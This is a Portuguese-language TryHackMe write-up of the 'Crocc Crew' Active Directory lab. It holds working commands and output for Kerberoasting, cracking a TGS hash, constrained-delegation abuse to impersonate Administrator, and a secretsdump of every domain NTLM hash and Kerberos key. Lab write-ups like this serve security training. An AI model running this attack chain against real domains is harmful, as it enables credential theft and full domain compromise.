---
title: THM Crocc Crew Writeup
author: Hastur
date: 2021-09-14 21:00:00 -0300
categories: [Writeups, Try Hack Me]
tags: [THM, Windows, Insane, LDAP, Kerberos, AD]
image: /img/thm/thm-crocccrew-logo.png
alt: "THM Crocc Crew Writeup"
---

<img src="/img/thm/thm-crocccrew-logo.png">

<br>


| Nome | [Crocc Crew](https://tryhackme.com/room/crocccrew)    |
|------|-------------|
|OS    | Windows       |
|Nível | Insane      |

<br>

Esta máquina tem algumas flags a mais do que as simples `user.flag` e `root.flag`, aparentemente precisaremos fazer alguns movimentos laterais antes de comprometer o server de forma completa.

<img src="/img/thm/thm-crocccrew-1.png">

Na descrição do projeto, sabemos que só temos acesso a um segmento de uma rede, um Domain Controller, e aparentemente ele já foi hackeado, a questão é `você consegue encontrar quem fez isso?`.

Vamos começar.

## RECON


### Nmap
```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ sudo nmap -v -p- -sCV -O -Pn 10.10.255.206 --min-rate=512
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-15 00:55:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2021-09-15T00:56:44+00:00
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Issuer: commonName=DC.COOCTUS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-06-07T02:37:18
| Not valid after:  2021-12-07T02:37:18
| MD5:   72be 3896 d880 1bc2 2455 1d55 33da 9300
|_SHA-1: bb1b c5bc 3aef ede9 3dc2 8b0d 0b00 c1d3 4371 19f4
|_ssl-date: 2021-09-15T00:58:08+00:00; -1h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC

```

Por se tratar de um Domain Controller, o nmap nos trouxe uma grande quantidade de portas abertas. Vamos começar pela 80.

### Porta 80

<img src="/img/thm/thm-crocccrew-2.png">

Encontramos na porta HTTP, uma página aparentemente já hackeada sem links relevantes, ao checar o `/robots.txt`, encontramos dois diretórios desabilitados.

<img src="/img/thm/thm-crocccrew-3.png">

Ao acessar o `/db-config.bak`, encontramos possíveis credenciais para um banco de dados.

<img src="/img/thm/thm-crocccrew-4.png">

Já no diretório `/backdoor.php` encontramos uma simulação de shell.

<img src="/img/thm/thm-crocccrew-5.png">

Aparentemente não passa de um `rabbit role` que nos fará perder tempo, vamos avançar na enumeração.

### Porta 3389 - RDP

Na enumeração com nmap, também encontramos a porta `3389`, que tipicamente é usada para o serviço `RDP`, não temos um usuário e nem uma senha, mas podemos tentar uma conexão com o `rdesktop`.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ rdesktop 10.10.255.206   
```

Entramos na tela de login, não temos credenciais, mas podemos ver um `stick` cortado pela tela no canto inferior direito.

<img src="/img/thm/thm-crocccrew-6.png">

Podemos rodar o rdesktop em tela cheia para visualizarmos o stick inteiro.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ rdesktop -f 10.10.255.206   
```

<img src="/img/thm/thm-crocccrew-7.png">

Encontramos as credenciais `Visitor:GuestLogin!`, porém, esta credencial não foi aceita no RDP.
Aparentemente é tudo que encontramos no RDP.

### SMB

O server também tem SMB, vamos tentar um acesso com `null session`.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ smbclient -L \\10.10.255.206
Enter WORKGROUP\hastur's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Não temos acesso com null session, mas podemos tentar com as credenciais que encontramos no stick do RDP.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ smbclient -L \\10.10.255.206 -U Visitor 
Enter WORKGROUP\Visitor's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
Desta vez conseguimos validar a credencial!!!

Vamos nos conectar no diretório `Home`.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ smbclient \\\\10.10.255.206\\Home -U Visitor 
Enter WORKGROUP\Visitor's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 15:42:53 2021
  ..                                  D        0  Tue Jun  8 15:42:53 2021
  user.txt                            A       17  Mon Jun  7 23:14:25 2021

                15587583 blocks of size 4096. 11430005 blocks available
smb: \> get user.txt 
getting file \user.txt of size 17 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```
Conseguimos nos autenticar conseguimos a primeira flag, a `user.txt`!!!

Porém nenhum outro diretório trouxe alguma informação relevante, vamos continuar as enumerações.

### LDAP

Como a credencial funcionou perfeitamente com o SMB, podemos tentar usá-la para obter indormações do AD, com o `ldapsearch`.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ ldapsearch -h 10.10.255.206 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=COOCTUS,DC=CORP
namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: DC=DomainDnsZones,DC=COOCTUS,DC=CORP
namingcontexts: DC=ForestDnsZones,DC=COOCTUS,DC=CORP

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ ldapsearch -h 10.10.255.206 -x -b "DC=COOCTUS,DC=CORP"
# extended LDIF
#
# LDAPv3
# base <DC=COOCTUS,DC=CORP> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

Agora rodando com autenticação, podemos obter informações mais completas sobre usuários, inclusive o possível `usuário implantado` que corresponde à segunda flag.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ ldapsearch -h 10.10.255.206 -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -W
----------CORTADO-----------
# admCroccCrew, Enterprise-Admins, Security-OU, COOCTUS.CORP
dn: CN=admCroccCrew,OU=Enterprise-Admins,OU=Security-OU,DC=COOCTUS,DC=CORP
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: admCroccCrew
givenName: admCroccCrew
distinguishedName: CN=admCroccCrew,OU=Enterprise-Admins,OU=Security-OU,DC=COOC
 TUS,DC=CORP
instanceType: 4
whenCreated: 20210608031534.0Z
whenChanged: 20210608062014.0Z
displayName: admCroccCrew
uSNCreated: 49236
memberOf: CN=Enterprise Admins,CN=Users,DC=COOCTUS,DC=CORP
uSNChanged: 69730
name: admCroccCrew
objectGUID:: ej4EyTrxQECq9t62o8ROGg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132676033890368878
lastLogoff: 0
lastLogon: 132676033917094150
pwdLastSet: 132676009478796916
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAJqvqeuD7CtfhfJd7YQQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: admCroccCrew
sAMAccountType: 805306368
userPrincipalName: admCroccCrew@COOCTUS.CORP
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
dSCorePropagationData: 20210608191453.0Z
dSCorePropagationData: 20210608185942.0Z
dSCorePropagationData: 20210608185055.0Z
dSCorePropagationData: 20210608062014.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132676009766264244

----------CORTADO-----------
```
O usuário implantado é `admCroccCrew`.

### Kerberos

Vimos na varredura com nmap que a porta 88 está aberta, tipicamente `kerberos`.
Podemos utilizar o `GetUserSPNs.py` para tentarmos obter um `TGT Ticket` com a credencial que temos.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:'GuestLogin!' -dc-ip 10.10.255.206 -outputfile hash
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)


```
Ótimo, conseguimos nos conectar, e aparentemente o nome do usuário é `password-reset`, mas não obtivemos resposta, isto acontece pelo fato da minha data e hora local, está fora do range do kerberos, conforme a mensagem de erro. Precisamos ajustar nossa hora de acordo com a hora do servidor.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ sudo net time set -S 10.10.255.206
[sudo] password for hastur: 
```

Agora tentando novamente, conseguimos a hash.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cooctus.corp/Visitor:'GuestLogin!' -dc-ip 10.10.255.206 -outputfile hash
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 

                                                                                                                     
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ ls -la
total 16
drwxr-xr-x  2 hastur hastur 4096 Sep 14 21:46 .
drwxr-xr-x 33 hastur hastur 4096 Sep 14  2021 ..
-rw-r--r--  1 hastur hastur 2016 Sep 14 21:46 hash
-rw-r--r--  1 hastur hastur   17 Sep 14  2021 user.txt
                                                                                                                     
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ cat hash
$krb5tgs$23$*password-reset$COOCTUS.CORP$cooctus.corp/password-reset*$856443556e2d8c04016648f5f7c47aac$ab62d496b9de12bd3b674760f374e6171f73181c5a4f5f3f033f1edb12663d3a264b8d87688689d11dd3eebb20536fceba58cb863736ea0fcb2a46f12e66d8aebb5ccbb9973f09ea22642805b71d58b7faa2e26dc3652c2d4586e95e660a6c98ec4b01c8a1f6258a26dc2839530eab17a6bf4d0430ca01f6fd4371bd6d5ac99563d2d7318e0078bf4c1dad4f42138e0ffb646213794b57d4f0e136929ec40cc28ea114b636919c35e797454bd019b04ee14f60ccaf1a33d6205d7ccf84572362910a9deab4fef36c862509383e23cbf41d1bcd26d64ab6244fcfd8f3653dd86220e564fd7be5ca2c6c6c43f359027831931a9aa0fa7abc1fa4a7b161f78b2385f1383819b53dd39993f23896ed21171b1155f1fa7ae9dfdd5e30282f171928dbfaa7d27ddc686c1f952f7dbaaeaf2649087907be62b0765d045250c84c36b4cb265b62dc85bd37a9ac707706de82002de994e3e86f637dec3ebf8dc5642b7d4fd2a8b2f7d2691d6080d6ab7ffd1af90ac3fb5206327a97e1fbbfd2f7bb47cbd12584b36d161da01e7fc854b35aae246718bec37722bfca3efe069f859d95f98854b9dfe773afbf3380d92ab01d4c09af14dc7563b3d61ebf742c089f58f660fe3f1a25e4a384fb375007e2254cbe88133cf1abaa492e2ea06e1008b154e08827b32468fa75aa811f462d020f4625c1e872cf43f7cc009bc6539fba74de6e39a6ef3d17276f25772fa444b5f1783bfbdb3cb70bbeda45b12f3c9b3cf10a8e341c66016dd6db65a84078d83043b19c359c5adba926713e4a86a12394ec4b05b35402f6cdbe95844b99beb4f8b25fd6b4efba07e3043e2e8643ae992118b20f43865c182505a76be0275d98cdc90efd0f2b3983b0005c23212a55376a7f7d97c6b6999ae0def9f0a9939c59ee364eb486346befe43cf6466d36d07e21b3e499cf80e17b5267fbf4ac59bce60c685aaa5ea012e17802bc983bc74f893923df61fa42f1522a7d4eabc507d08c768d03bf0600f467dad2878c4382a908510a95ef96da80b0add4d898a5986305f776a332f549fa86315d0388b7ff84d833a5b17cb86b49b52063a1b7dd80b71e9b72f067f5ea252564f87c443660eefabd92bea5f86310ca29ad29fa78b7f132cbf9fb301f7f7a69712d54c031d1d47970261ab97b3e942f9e2ccad85c21c66484f39d436a7212b3c2831fa71af179c8b8884a3d6698668d224ebbc4782fdd6de86fa1dc4f84b4baa3c0034e584a4b136f479344d350d0261b2126161898fcaec220111f5fef17e43a3edad0097cb79031ff188064d4095e30f14c85b40fde566fff5d11d4d86409a1594e21fa802b7a5c50
```

Podemos tentar quebrá-la com o `john`.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)
1g 0:00:00:00 DONE (2021-09-14 21:48) 5.555g/s 1319Kp/s 1319Kc/s 1319KC/s rikelme..nichel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Com a credencial `password-reset:resetpassword`, podemos verificar se ele possui a opção `impersonate` habilitada e tentar um `TGT Silver Ticket` no kerberos.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.255.206 -spn HTTP/dc.cooctus.corp -impersonate Administrator cooctus.corp/password-reset:resetpassword
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user password-reset or initial TGT not forwardable

```
Aparentemente este `SPN` não é habillitado para delegar um TGT silver ticket para este usuário.
Podemos verificar se existe algum SPN habilitado a delegar, com o `impacket-findDelegation.py`.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/findDelegation.py cooctus.corp/password-reset:resetpassword -dc-ip 10.10.255.206
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

AccountName     AccountType  DelegationType                      DelegationRightsTo                  
--------------  -----------  ----------------------------------  -----------------------------------
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP              
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                           
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS      
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS   
```

Ótimo, encontramos alternativas para o SPN.

Vamos tentar o Silver Ticket novamente.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.10.255.206 -spn oakley/DC.COOCTUS.CORP -impersonate Administrator cooctus.corp/password-reset:resetpassword
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
                                                                                                                     
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ ls -la
total 20
drwxr-xr-x  2 hastur hastur 4096 Sep 14 22:03 .
drwxr-xr-x 33 hastur hastur 4096 Sep 14 21:56 ..
-rw-r--r--  1 hastur hastur 1565 Sep 14 22:03 Administrator.ccache
-rw-r--r--  1 hastur hastur 2016 Sep 14 21:46 hash
-rw-r--r--  1 hastur hastur   17 Sep 14  2021 user.txt
```

Ótimo, conseguimos recuperar as credenciais do Administrador que foram armazenadas no arquivo `Administrator.ccache`, este arquivo deve ser colocado em uma variável para que possamos utilizá-lo.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ export KRB5CCNAME=Administrator.ccache
```

## Capturando as Hashes

Com as credenciais do Administrador em mãos e salvas em uma variável, podemos utilizar o `secretsdump.py` para capturar as hashes.

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Cleaning up...
```

O secretsdump nos trouxe um erro, mas provavelmente porque não reconheceu o `DC.COOCTUS.CORP`, precisamos adicioná-lo em `/etc/hosts`. Após a inclusão, tentamos outra vez.

<img src="/img/thm/thm-crocccrew-8.png">

```bash
┌──(hastur㉿hastur)-[~/CroccCrew]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:2878ba3e01019d97754058e82113bc45e2efc6414a89804c6939fd411029f452735078dca29cbe0c68a957e62aa648741fee7954fc38d3f9410430920d8be3e4114a44037de3dbedf624ca07680126a1ea95a2c73a784c6babd59532e70049a61ef49a5e398231beb345720d5be76c27dd4e9f0cfd63388ce7193fdba2b2f6ec371076e9b34762f791ff8fc73e5a29f548b30f66c3a658f0c11953d5375621b09ffdc800085422a28889a4c2b1830af7b30bf5521f1b5f2bdefcc2f2642c3291f641af22c8deb74f8aba62a37841ff2116df9939c1b36368acfbc7ae7e9b14ab9b1ff5bee0e73968381b3d913fbd2dec
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:8974754c17974ff870762db617c2b60c:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874ec195cd5d389a09:::
COOCTUS.CORP\jon:1128:aad3b435b51404eeaad3b435b51404ee:7f828aaed37d032d7305d6d5016ccbb3:::
COOCTUS.CORP\Varg:1129:aad3b435b51404eeaad3b435b51404ee:7da62b00d4b258a03708b3c189b41a7e:::
COOCTUS.CORP\evan:1130:aad3b435b51404eeaad3b435b51404ee:8c4b625853d78e84fb8b3c4bcd2328c5:::
COOCTUS.CORP\Ben:1131:aad3b435b51404eeaad3b435b51404ee:1ce6fec89649608d974d51a4d6066f12:::
COOCTUS.CORP\David:1132:aad3b435b51404eeaad3b435b51404ee:f863e27063f2ccfb71914b300f69186a:::
COOCTUS.CORP\password-reset:1134:aad3b435b51404eeaad3b435b51404ee:0fed9c9dc78da2c6f37f885ee115585c:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:8974754c17974ff870762db617c2b60c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
Administrator:des-cbc-md5:5243234aef9d0e83
krbtgt:aes256-cts-hmac-sha1-96:25776b9622e67e69a5aee9cf532aa6ffec9318ba780e2f5c966c0519d5958f1e
krbtgt:aes128-cts-hmac-sha1-96:69988d411f292b02157b8fc1b539bd98
krbtgt:des-cbc-md5:d9eff2048f2f3e46
COOCTUS.CORP\Visitor:aes256-cts-hmac-sha1-96:e107d748348260a625b7635855f0f403731a06837f2875bec8e15b4be9e017c3
COOCTUS.CORP\Visitor:aes128-cts-hmac-sha1-96:d387522d6ce2698ddde8c0f5126eca90
COOCTUS.CORP\Visitor:des-cbc-md5:a8023e2c04e910fb
COOCTUS.CORP\mark:aes256-cts-hmac-sha1-96:ee0949690f31a22898f0808386aa276b2303f82a6b06da39b9735da1b5fc4c8d
COOCTUS.CORP\mark:aes128-cts-hmac-sha1-96:ce5df3dfb717b5649ef59e9d8d028c78
COOCTUS.CORP\mark:des-cbc-md5:83da7acd5b85c2f1
COOCTUS.CORP\Jeff:aes256-cts-hmac-sha1-96:c57c7d8f9011d0f11633ae83a2db2af53af09d47a9c27fc05e8a932686254ef0
COOCTUS.CORP\Jeff:aes128-cts-hmac-sha1-96:e95538a0752f71a2e615e88fbf3f9151
COOCTUS.CORP\Jeff:des-cbc-md5:4c318a40a792feb0
COOCTUS.CORP\Spooks:aes256-cts-hmac-sha1-96:c70088aaeae0b4fbaf129e3002b4e99536fa97404da96c027626dcfcd4509800
COOCTUS.CORP\Spooks:aes128-cts-hmac-sha1-96:7f95dc2d8423f0607851a27c46e3ba0d
COOCTUS.CORP\Spooks:des-cbc-md5:0231349bcd549b97
COOCTUS.CORP\Steve:aes256-cts-hmac-sha1-96:48edbdf191165403dca8103522bc953043f0cd2674f103069c1012dc069e6fd2
COOCTUS.CORP\Steve:aes128-cts-hmac-sha1-96:6f3a688e3d88d44c764253470cf95d0c
COOCTUS.CORP\Steve:des-cbc-md5:0d54b320cba7627a
COOCTUS.CORP\Howard:aes256-cts-hmac-sha1-96:6ea6db6a4d5042326f93037d4ec4284d6bbd4d79a6f9b07782aaf4257baa13f8
COOCTUS.CORP\Howard:aes128-cts-hmac-sha1-96:6926ab9f1a65d7380de82b2d29a55537
COOCTUS.CORP\Howard:des-cbc-md5:9275c8ba40a16b86
COOCTUS.CORP\admCroccCrew:aes256-cts-hmac-sha1-96:3fb5b3d1bdfc4aff33004420046c94652cba6b70fd9868ace49d073170ec7db1
COOCTUS.CORP\admCroccCrew:aes128-cts-hmac-sha1-96:19894057a5a47e1b6991c62009b8ded4
COOCTUS.CORP\admCroccCrew:des-cbc-md5:ada854ce919d2c75
COOCTUS.CORP\Fawaz:aes256-cts-hmac-sha1-96:4f2b258698908a6dbac21188a42429ac7d89f5c7e86dcf48df838b2579b262bc
COOCTUS.CORP\Fawaz:aes128-cts-hmac-sha1-96:05d26514fe5a64e76484e5cf84c420c1
COOCTUS.CORP\Fawaz:des-cbc-md5:a7d525e501ef1fbc
COOCTUS.CORP\karen:aes256-cts-hmac-sha1-96:dc423de7c5e44e8429203ca226efed450ed3d25d6d92141853d22fee85fddef0
COOCTUS.CORP\karen:aes128-cts-hmac-sha1-96:6e66c00109942e45588c448ddbdd005d
COOCTUS.CORP\karen:des-cbc-md5:a27cf23eaba4708a
COOCTUS.CORP\cryillic:aes256-cts-hmac-sha1-96:f48f9f9020cf318fff80220a15fea6eaf4a163892dd06fd5d4e0108887afdabc
COOCTUS.CORP\cryillic:aes128-cts-hmac-sha1-96:0b8dd6f24f87a420e71b4a649cd28a39
COOCTUS.CORP\cryillic:des-cbc-md5:6d92892ab9c74a31
COOCTUS.CORP\yumeko:aes256-cts-hmac-sha1-96:7c3bd36a50b8f0b880a1a756f8f2495c14355eb4ab196a337c977254d9dfd992
COOCTUS.CORP\yumeko:aes128-cts-hmac-sha1-96:0d33127da1aa3f71fba64525db4ffe7e
COOCTUS.CORP\yumeko:des-cbc-md5:8f404a1a97e0435e
COOCTUS.CORP\pars:aes256-cts-hmac-sha1-96:0c72d5f59bc70069b5e23ff0b9074caf6f147d365925646c33dd9e649349db86
COOCTUS.CORP\pars:aes128-cts-hmac-sha1-96:79314ceefa18e30a02627761bb8dfee9
COOCTUS.CORP\pars:des-cbc-md5:15d552643220868a
COOCTUS.CORP\kevin:aes256-cts-hmac-sha1-96:9982245b622b09c28c77adc34e563cd30cb00d159c39ecc7bc0f0a8857bcc065
COOCTUS.CORP\kevin:aes128-cts-hmac-sha1-96:51cc7562d3de39f345b68e6923725a6a
COOCTUS.CORP\kevin:des-cbc-md5:89201a58e33ed9ba
COOCTUS.CORP\jon:aes256-cts-hmac-sha1-96:9fa5e82157466b813a7b05c311a25fd776182a1c6c9e20d15330a291c3e961e5
COOCTUS.CORP\jon:aes128-cts-hmac-sha1-96:a6202c53070db2e3b5327cef1bb6be86
COOCTUS.CORP\jon:des-cbc-md5:0dabe370ab64f407
COOCTUS.CORP\Varg:aes256-cts-hmac-sha1-96:e85d21b0c9c41eb7650f4af9129e10a83144200c4ad73271a31d8cd2525bdf45
COOCTUS.CORP\Varg:aes128-cts-hmac-sha1-96:afd9fe7026c127d2b6e84715f3fcc879
COOCTUS.CORP\Varg:des-cbc-md5:8cb92637260eb5c4
COOCTUS.CORP\evan:aes256-cts-hmac-sha1-96:d8f0a955ae809ce3ac33b517e449a70e0ab2f34deac0598abc56b6d48347cdc3
COOCTUS.CORP\evan:aes128-cts-hmac-sha1-96:c67fc5dcd5a750fe0f22ad63ffe3698b
COOCTUS.CORP\evan:des-cbc-md5:c246c7f152d92949
COOCTUS.CORP\Ben:aes256-cts-hmac-sha1-96:1645867acea74aecc59ebf08d7e4d98a09488898bbf00f33dbc5dd2c8326c386
